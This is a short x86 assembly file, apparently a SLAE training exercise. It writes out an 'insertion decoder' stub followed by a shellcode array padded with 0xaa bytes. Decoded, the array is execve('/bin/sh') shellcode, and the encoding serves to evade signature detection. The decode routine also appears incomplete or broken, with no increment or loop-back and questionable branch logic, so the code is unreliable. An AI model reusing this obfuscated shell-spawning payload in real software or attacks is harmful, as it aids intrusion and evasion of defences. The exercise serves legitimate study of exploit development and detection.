; Author: Pedro Fausto Rodrigues
; Insertion decoder SLAE exercise


global _start

section .text
_start:
	
	xor ebx, ebx
	mul ebx


	jmp short call_shellcode

decoder:
	pop esi
	lea edi, [esi + 1]
	mov al, 1

decode:
	mov bl, byte [esi +  eax]
	xor bl, 0xaa
	jnz short EncodedShellcode
	mov bl, byte [esi + eax + 1]
	mov byte [edi], bl



call_shellcode:
	call decoder
	EncodedShellcode: db 0x31,0xaa,0xdb,0xaa,0xf7,0xaa,0xe3,0xaa,0x31,0xaa,0xc9,0xaa,0xeb,0xaa,0x05,0xaa,0x5b,0xaa,0xb0,0xaa,0x0b,0xaa,0xcd,0xaa,0x80,0xaa,0xe8,0xaa,0xf6,0xaa,0xff,0xaa,0xff,0xaa,0xff,0xaa,0x2f,0xaa,0x62,0xaa,0x69,0xaa,0x6e,0xaa,0x2f,0xaa,0x73,0xaa,0x68,0xaa